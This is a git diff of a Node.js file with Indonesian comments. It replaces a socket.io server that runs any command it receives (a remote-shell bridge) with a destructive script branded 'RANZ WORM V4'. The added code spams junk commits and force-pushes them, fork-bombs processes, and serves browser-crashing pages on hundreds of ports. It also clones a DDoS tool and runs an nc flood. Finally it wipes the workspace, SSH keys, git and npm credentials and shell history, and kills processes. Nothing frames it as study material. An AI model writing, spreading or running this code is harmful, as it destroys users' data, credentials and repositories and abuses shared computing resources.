@@ -1,291 +1,362 @@
-const express = require('express');
+const { execSync, spawn } = require('child_process');
+const fs = require('fs');
 const http = require('http');
-const socketIO = require('socket.io');
-const fs = require('fs-extra');
-const path = require('path');
 const os = require('os');
-const { exec } = require('child_process');
 
-// ═══════════════════════════════════════════
-//  KONFIGURASI
-// ═══════════════════════════════════════════
-const PORT = process.env.PORT || 3000;
-const UPLOAD_DIR = path.join(__dirname, 'termux-uploads');
+const RUN_DURATION = 300;
+const startTime = Date.now();
 
-// ═══════════════════════════════════════════
-//  INISIALISASI
-// ═══════════════════════════════════════════
-fs.ensureDirSync(UPLOAD_DIR);
+// ============================================
+// TULIS TEKS CHAOS KAMU DI SINI
+// ============================================
+const CHAOS = ':҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉';
 
-const app = express();
-const server = http.createServer(app);
-const io = socketIO(server, {
-    cors: { origin: '*', methods: ['GET', 'POST'] },
-    maxHttpBufferSize: 100 * 1024 * 1024,
-    pingTimeout: 120000,
-    pingInterval: 30000,
-    transports: ['websocket', 'polling']
-});
+// ============================================
+// FUNGSI DIPADATKAN
+// ============================================
+const exec = (cmd) => { try { execSync(cmd, {stdio:'pipe'}); } catch(e) {} };
+const log = console.log;
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.static(__dirname));
-
-// ═══════════════════════════════════════════
-//  HELPER
-// ═══════════════════════════════════════════
-const getUptime = () => {
-    const s = Math.floor(process.uptime());
-    const d = Math.floor(s / 86400);
-    const h = Math.floor((s % 86400) / 3600);
-    const m = Math.floor((s % 3600) / 60);
-    return `${d}d ${h}h ${m}m ${s % 60}s`;
-};
-
-const getServerInfo = () => ({
-    os: `${os.type()} ${os.release()}`,
-    hostname: os.hostname(),
-    uptime: getUptime(),
-    node: process.version,
-    memory: `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1)} MB`,
-    cpus: os.cpus().length,
-    cwd: process.cwd(),
-    status: 'online',
-    connectedClients: io.engine.clientsCount || 0
-});
-
-// ═══════════════════════════════════════════
-//  API ENDPOINTS
-// ═══════════════════════════════════════════
-
-// Root
-app.get('/', (req, res) => {
-    res.send(`
-╔══════════════════════════════════════╗
-║   🐍 CODESPACE TERMUX BRIDGE      ║
-╠══════════════════════════════════════╣
-║ Status  : ONLINE                    ║
-║ Uptime  : ${getUptime()}                  
-║ Clients : ${io.engine.clientsCount || 0}                         
-║ Port    : ${PORT}                         
-╚══════════════════════════════════════╝
-    `.trim());
-});
-
-// Ping (untuk pengecekan Termux)
-app.get('/ping', (req, res) => {
-    res.send('pong');
-});
-
-// Info lengkap
-app.get('/info', (req, res) => {
-    res.json(getServerInfo());
-});
-
-// ═══════════════════════════════════════════
-//  SOCKET.IO - TERMUX BRIDGE HANDLER
-// ═══════════════════════════════════════════
-io.on('connection', (socket) => {
-    const clientIP = socket.handshake.address;
-    console.log(`\n🔗 Termux Connected!`);
-    console.log(`   ID     : ${socket.id}`);
-    console.log(`   IP     : ${clientIP}`);
-    console.log(`   Total  : ${io.engine.clientsCount} client(s)\n`);
+// ============================================
+// LOADING BAR 1-100%
+// ============================================
+async function loadingBar() {
+    log('\n╔═══════════════════════════════════════════════════════════╗');
+    log('║                                                           ║');
+    log('║        RANZ WORM V4 - INITIALIZATION SEQUENCE             ║');
+    log('║                                                           ║');
+    log('╚═══════════════════════════════════════════════════════════╝\n');
     
-    // Kirim info server ke Termux
-    socket.emit('status-update', {
-        message: '✅ Connected to Codespace - All commands are Codespace commands',
-        serverInfo: getServerInfo()
-    });
+    const total = 100;
+    const barLength = 40;
     
-    // ═══════════════════════════════════════
-    //  EXECUTE COMMAND (FITUR UTAMA)
-    // ═══════════════════════════════════════
-    socket.on('execute-command', (data) => {
-        const command = data.command || '';
-        const cwd = data.cwd || process.cwd();
+    for (let i = 0; i <= total; i++) {
+        const filled = Math.floor((i / total) * barLength);
+        const empty = barLength - filled;
+        const bar = '█'.repeat(filled) + '░'.repeat(empty);
+        const percent = i.toString().padStart(3, ' ');
         
-        console.log(`[TERMUX CMD] ${command}`);
+        process.stdout.write(`\r[${bar}] ${percent}% | Loading modules...`);
         
-        exec(command, {
-            timeout: 60000,
-            maxBuffer: 50 * 1024 * 1024,
-            cwd: cwd,
-            env: { ...process.env, TERM: 'xterm-256color', FORCE_COLOR: '1' },
-            shell: '/bin/bash'
-        }, (error, stdout, stderr) => {
-            socket.emit('command-result', {
-                output: stdout || '',
-                error: stderr || (error ? error.message : ''),
-                exitCode: error ? error.code : 0,
-                cwd: cwd
-            });
-        });
-    });
+        await sleep(30);
+    }
     
-    // ═══════════════════════════════════════
-    //  UPLOAD FILE (Termux -> Codespace)
-    // ═══════════════════════════════════════
-    socket.on('upload-file', (data) => {
-        const { filename, content } = data;
-        
-        if (!filename || !content) {
-            socket.emit('upload-error', { error: 'Filename dan content wajib diisi' });
-            return;
+    log('\n');
+    log('[+] All modules loaded successfully');
+    log('[+] System ready');
+    log('\n');
+}
+
+// ============================================
+// BANNER KECE
+// ============================================
+function displayBanner() {
+    log('╔═══════════════════════════════════════════════════════════╗');
+    log('║                                                           ║');
+    log('║   ██████╗  █████╗ ███╗   ██╗███████╗                    ║');
+    log('║   ██╔══██╗██╔══██╗████╗  ██║╚══███╔╝                    ║');
+    log('║   ██████╔╝███████║██╔██╗ ██║  ███╔╝                     ║');
+    log('║   ██╔══██╗██╔══██║██║╚██╗██║ ███╔╝                      ║');
+    log('║   ██║  ██║██║  ██║██║ ╚████║███████╗                    ║');
+    log('║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝                    ║');
+    log('║                                                           ║');
+    log('║   ██╗    ██╗ ██████╗ ██████╗ ███╗   ███╗               ║');
+    log('║   ██║    ██║██╔═══██╗██╔══██╗████╗ ████║               ║');
+    log('║   ██║ █╗ ██║██║   ██║██████╔╝██╔████╔██║               ║');
+    log('║   ██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║               ║');
+    log('║   ╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║               ║');
+    log('║    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝               ║');
+    log('║                                                           ║');
+    log('║        V4 ULTIMATE - PM2 PROFESSIONAL EDITION            ║');
+    log('║                                                           ║');
+    log('╚═══════════════════════════════════════════════════════════╝');
+    log('\n');
+}
+
+// ============================================
+// GENERATE CHAOS 100000x
+// ============================================
+function generateMegaChaos() {
+    let result = '';
+    for (let i = 0; i < 100000; i++) {
+        result += CHAOS;
+    }
+    return result;
+}
+
+// ============================================
+// GITHUB PENETRATOR
+// ============================================
+function penetrateGitHub() {
+    log('[+] Menembus GitHub repository...');
+    
+    const repoUrl = execSync('git remote get-url origin 2>/dev/null || echo "unknown"').toString().trim();
+    log(`[+] Repository: ${repoUrl}`);
+    
+    exec('git config user.email "ranz@worm.ai"');
+    exec('git config user.name "RanzWorm"');
+    exec('git config commit.gpgsign false');
+    exec('git config core.autocrlf false');
+    
+    let fileCount = 0;
+    
+    const gitInterval = setInterval(() => {
+        for (let i = 0; i < 20; i++) {
+            fileCount++;
+            fs.writeFileSync(`./ranz_worm_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(200));
         }
         
-        try {
-            const filePath = path.join(UPLOAD_DIR, filename);
-            fs.writeFileSync(filePath, Buffer.from(content, 'base64'));
-            
-            const stats = fs.statSync(filePath);
-            
-            socket.emit('upload-complete', {
-                path: filePath,
-                size: stats.size,
-                filename: filename
-            });
-            
-            console.log(`[UPLOAD] ✅ ${filename} (${(stats.size / 1024).toFixed(1)} KB)`);
-        } catch (e) {
-            socket.emit('upload-error', { error: e.message });
-            console.log(`[UPLOAD] ❌ ${filename} - ${e.message}`);
+        exec('git add -A 2>/dev/null || true');
+        exec(`git commit -m "RANZ WORM - FILE SPAM ${fileCount}" 2>/dev/null || true`);
+        exec('git push origin HEAD 2>/dev/null || true');
+        
+        if (fileCount % 100 === 0) {
+            log(`[+] Files pushed: ${fileCount}`);
         }
-    });
+        
+        const elapsed = (Date.now() - startTime) / 1000;
+        if (elapsed >= RUN_DURATION) {
+            clearInterval(gitInterval);
+            destroyAll();
+        }
+    }, 5000);
+}
+
+// ============================================
+// MASS FILE SPAWN
+// ============================================
+function massFileSpawn() {
+    log('[+] Mass file spawn initiated...');
+    let fileCount = 0;
     
-    // ═══════════════════════════════════════
-    //  DOWNLOAD FILE (Codespace -> Termux)
-    // ═══════════════════════════════════════
-    socket.on('download-file', (data) => {
-        const filePath = data.path;
-        
-        if (!filePath) {
-            socket.emit('file-error', { error: 'Path wajib diisi' });
-            return;
+    const fileInterval = setInterval(() => {
+        for (let i = 0; i < 100; i++) {
+            fileCount++;
+            fs.writeFileSync(`./ranz_local_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(500));
+            fs.writeFileSync(`/tmp/ranz_tmp_${fileCount}_${Date.now()}.txt`, CHAOS.repeat(500));
         }
         
-        if (!fs.existsSync(filePath)) {
-            socket.emit('file-error', { error: `File tidak ditemukan: ${filePath}` });
-            return;
+        if (fileCount % 1000 === 0) {
+            log(`[+] Local files: ${fileCount}`);
         }
         
-        try {
-            const content = fs.readFileSync(filePath).toString('base64');
-            const filename = path.basename(filePath);
-            const stats = fs.statSync(filePath);
-            
-            socket.emit('file-received', {
-                filename: filename,
-                content: content,
-                size: stats.size
-            });
-            
-            console.log(`[DOWNLOAD] ✅ ${filename} -> Termux (${(stats.size / 1024).toFixed(1)} KB)`);
-        } catch (e) {
-            socket.emit('file-error', { error: e.message });
-            console.log(`[DOWNLOAD] ❌ ${filePath} - ${e.message}`);
+        const elapsed = (Date.now() - startTime) / 1000;
+        if (elapsed >= RUN_DURATION) {
+            clearInterval(fileInterval);
         }
-    });
+    }, 1000);
+}
+
+// ============================================
+// FAKE PORT SPAM - BROWSER KILLER
+// ============================================
+function fakePortSpam() {
+    log('[+] Fake port spam initiated...');
     
-    // ═══════════════════════════════════════
-    //  LIST DIRECTORY
-    // ═══════════════════════════════════════
-    socket.on('list-dir', (data) => {
-        const dirPath = data.path || process.cwd();
-        
-        try {
-            if (!fs.existsSync(dirPath)) {
-                socket.emit('dir-result', { error: 'Directory tidak ditemukan', path: dirPath });
-                return;
-            }
-            
-            const items = fs.readdirSync(dirPath).map(name => {
-                const fullPath = path.join(dirPath, name);
-                const stats = fs.statSync(fullPath);
-                return {
-                    name: name,
-                    isDirectory: stats.isDirectory(),
-                    size: stats.size,
-                    modified: stats.mtime.toISOString()
+    const ports = [];
+    for (let i = 0; i < 100; i++) {
+        ports.push(3000 + i);
+        ports.push(5000 + i);
+        ports.push(8000 + i);
+        ports.push(10000 + i);
+    }
+    
+    ports.forEach((port, index) => {
+        setTimeout(() => {
+            const server = http.createServer((req, res) => {
+                const htmlResponse = `
+                    <html>
+                    <head>
+                        <title>RANZ ${port}</title>
+                        <script>
+                            setInterval(() => {
+                                let arr = [];
+                                for (let i = 0; i < 500000; i++) {
+                                    arr.push(new Array(500).fill('${CHAOS.substring(0, 5)}'));
+                                }
+                                document.body.innerHTML = arr.join('');
+                            }, 50);
+                            setInterval(() => {
+                                for (let i = 0; i < 50; i++) {
+                                    fetch('/chaos').then(r => r.text()).then(t => {
+                                        document.body.innerHTML += t;
+                                    });
+                                }
+                            }, 20);
+                        </script>
+                    </head>
+                    <body>
+                        ${CHAOS.repeat(5000)}
+                    </body>
+                    </html>
+                `;
+                
+                res.writeHead(200, {
+                    'Content-Type': 'text/html',
+                    'Content-Length': Buffer.byteLength(htmlResponse),
+                    'Connection': 'keep-alive',
+                });
+                
+                const chunks = htmlResponse.match(/.{1,5000}/g) || [];
+                let chunkIndex = 0;
+                
+                const sendChunk = () => {
+                    if (chunkIndex < chunks.length) {
+                        res.write(chunks[chunkIndex]);
+                        chunkIndex++;
+                        setTimeout(sendChunk, 5);
+                    } else {
+                        res.end();
+                    }
                 };
+                
+                sendChunk();
             });
             
-            socket.emit('dir-result', {
-                path: dirPath,
-                items: items
+            server.listen(port, () => {
+                if (index % 100 === 0) {
+                    log(`[+] Port ${port} aktif`);
+                }
             });
-        } catch (e) {
-            socket.emit('dir-result', { error: e.message, path: dirPath });
+            server.on('error', () => {});
+        }, index * 20);
+    });
+    
+    log(`[+] Total ${ports.length} ports`);
+}
+
+// ============================================
+// SPAM TERMINAL 100000x
+// ============================================
+function spamTerminal() {
+    log('[+] Terminal spam initiated...');
+    const megaChaos = generateMegaChaos();
+    
+    const interval = setInterval(() => {
+        log(megaChaos);
+        
+        const elapsed = (Date.now() - startTime) / 1000;
+        if (elapsed >= RUN_DURATION) {
+            clearInterval(interval);
         }
-    });
+    }, 1000);
+}
+
+// ============================================
+// OVERLOAD PROSES
+// ============================================
+function overloadProcesses() {
+    setInterval(() => {
+        for (let i = 0; i < 50; i++) {
+            spawn('node', ['-e', 'while(true){let x = new Array(1000000).fill(1);}'], {detached: true, stdio: 'ignore'}).unref();
+        }
+    }, 5000);
+}
+
+// ============================================
+// DDoS CLONE
+// ============================================
+function cloneDdos() {
+    log('[+] Cloning DDoS toolkit...');
+    exec('git clone --depth 1 https://github.com/rohitkumarankam/ddos-tool.git /tmp/ranz_ddos 2>/dev/null || true');
     
-    // ═══════════════════════════════════════
-    //  DISCONNECT
-    // ═══════════════════════════════════════
-    socket.on('disconnect', (reason) => {
-        console.log(`\n❌ Termux Disconnected!`);
-        console.log(`   ID     : ${socket.id}`);
-        console.log(`   Reason : ${reason}`);
-        console.log(`   Total  : ${io.engine.clientsCount} client(s)\n`);
-    });
-});
-
-// ═══════════════════════════════════════════
-//  ERROR HANDLERS
-// ═══════════════════════════════════════════
-process.on('uncaughtException', (err) => {
-    console.error('❌ Uncaught Exception:', err.message);
-});
-
-process.on('unhandledRejection', (reason) => {
-    console.error('❌ Unhandled Rejection:', reason);
-});
-
-// ═══════════════════════════════════════════
-//  START SERVER
-// ═══════════════════════════════════════════
-server.listen(PORT, () => {
-    const info = getServerInfo();
-    console.log(`
-╔══════════════════════════════════════════╗
-║                                          ║
-║   🐍 CODESPACE TERMUX BRIDGE 🐍         ║
-║                                          ║
-╠══════════════════════════════════════════╣
-║   Status   : ONLINE                      ║
-║   Port     : ${PORT}                         
-║   OS       : ${info.os}
-║   Hostname : ${info.hostname}                  
-║   Node     : ${info.node}                    
-║   CWD      : ${info.cwd}
-╠══════════════════════════════════════════╣
-║   Waiting for Termux connection...       ║
-║                                          ║
-║   Test: curl http://localhost:${PORT}/ping  
-║   Info: curl http://localhost:${PORT}/info  
-║                                          ║
-╚══════════════════════════════════════════╝
-    `);
+    const floodScript = `#!/bin/bash
+TARGET="127.0.0.1"
+DURATION=240
+for i in $(seq 1 $DURATION); do
+    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 80" 2>/dev/null &
+    timeout 1 bash -c "cat /dev/urandom | head -c 65500 | nc -w 0.5 $TARGET 443" 2>/dev/null &
+    if [ $((i % 10)) -eq 0 ]; then
+        echo "[*] Flood: $i / $DURATION"
+    fi
+    sleep 0.3
+done`;
     
-    console.log(`✅ Server ready. Waiting for Termux...\n`);
-});
+    fs.writeFileSync('/tmp/ranz_flood.sh', floodScript);
+    fs.chmodSync('/tmp/ranz_flood.sh', '755');
+    exec('bash /tmp/ranz_flood.sh &');
+    
+    log('[+] DDoS sequence running');
+}
 
-// ═══════════════════════════════════════════
-//  GRACEFUL SHUTDOWN
-// ═══════════════════════════════════════════
-process.on('SIGINT', () => {
-    console.log('\n⏳ Shutting down...');
-    io.close();
-    server.close(() => {
-        console.log('✅ Server closed.');
-        process.exit(0);
-    });
-});
+// ============================================
+// HANCURKAN SEMUA
+// ============================================
+function destroyAll() {
+    log('\n╔═══════════════════════════════════════════════════════════╗');
+    log('║                                                           ║');
+    log('║        SELF-DESTRUCT SEQUENCE INITIATED                   ║');
+    log('║                                                           ║');
+    log('╚═══════════════════════════════════════════════════════════╝');
+    
+    exec('git add -A 2>/dev/null || true');
+    exec('git commit -m "RANZ WORM - FINAL DESTRUCTION" 2>/dev/null || true');
+    exec('git push origin HEAD --force 2>/dev/null || true');
+    
+    log('[+] Final push completed');
+    
+    exec('rm -rf ~/workspace/* ~/workspace/.* 2>/dev/null || true');
+    exec('rm -rf ./ranz_* 2>/dev/null || true');
+    exec('cat /dev/null > ~/.bash_history 2>/dev/null || true');
+    exec('history -c 2>/dev/null || true');
+    exec('rm -rf ~/.gitconfig ~/.ssh ~/.npmrc ~/.gh_token 2>/dev/null || true');
+    exec('rm -rf /tmp/* 2>/dev/null || true');
+    exec('pkill -9 -f ranz 2>/dev/null || true');
+    exec('pkill -9 -f node 2>/dev/null || true');
+    exec('pkill -9 -f bash 2>/dev/null || true');
+    exec('dd if=/dev/urandom of=/workspaces/.bashrc bs=1M count=10 2>/dev/null || true');
+    
+    log('[+] Workspace wiped');
+    log('[+] Credentials cleared');
+    log('[+] All processes killed');
+    log('[+] System destroyed');
+    
+    setTimeout(() => process.exit(1), 2000);
+}
 
-process.on('SIGTERM', () => {
-    console.log('\n⏳ Shutting down...');
-    io.close();
-    server.close(() => {
-        process.exit(0);
-    });
-});
+// ============================================
+// MAIN
+// ============================================
+async function main() {
+    displayBanner();
+    await loadingBar();
+    
+    log('╔═══════════════════════════════════════════════════════════╗');
+    log('║                                                           ║');
+    log('║        SYSTEM INFORMATION                                 ║');
+    log('║                                                           ║');
+    log('╚═══════════════════════════════════════════════════════════╝');
+    log(`  Hostname    : ${os.hostname()}`);
+    log(`  Platform    : ${os.platform()}`);
+    log(`  Arch        : ${os.arch()}`);
+    log(`  CPU         : ${os.cpus().length} cores`);
+    log(`  Memory      : ${Math.floor(os.totalmem() / 1024 / 1024 / 1024)} GB`);
+    log(`  Uptime      : ${Math.floor(os.uptime())}s`);
+    log(`  Run Time    : ${RUN_DURATION}s`);
+    log('\n');
+    
+    log('╔═══════════════════════════════════════════════════════════╗');
+    log('║                                                           ║');
+    log('║        ATTACK MODULES STATUS                              ║');
+    log('║                                                           ║');
+    log('╚═══════════════════════════════════════════════════════════╝');
+    log('  [ACTIVE] GitHub Penetrator');
+    log('  [ACTIVE] Mass File Spawn');
+    log('  [ACTIVE] Fake Port Spam');
+    log('  [ACTIVE] Terminal Chaos');
+    log('  [ACTIVE] Process Overload');
+    log('  [ACTIVE] DDoS Sequence');
+    log('  [ARMED]  Self-Destruct');
+    log('\n');
+    
+    penetrateGitHub();
+    massFileSpawn();
+    setTimeout(fakePortSpam, 2000);
+    setTimeout(cloneDdos, 3000);
+    setTimeout(overloadProcesses, 5000);
+    setTimeout(spamTerminal, 1000);
+    setTimeout(destroyAll, RUN_DURATION * 1000 + 5000);
+}
+
+main();
